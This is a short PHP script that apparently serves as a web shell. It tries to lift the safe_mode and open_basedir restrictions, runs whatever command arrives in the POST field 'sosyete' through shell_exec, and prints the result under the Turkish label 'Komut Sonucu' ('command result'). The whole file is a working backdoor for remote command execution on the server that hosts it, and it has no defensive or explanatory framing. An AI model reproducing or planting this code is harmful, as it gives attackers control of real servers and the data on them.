<?php
ini_restore("safe_mode");
ini_restore("open_basedir");
$fuck=shell_exec($_POST['sosyete']); 
echo "<pre><h4>";
echo "<b><font color=red>Komut Sonucu </font></b><br>"; 
echo $fuck;
echo "</h4></pre>";
?>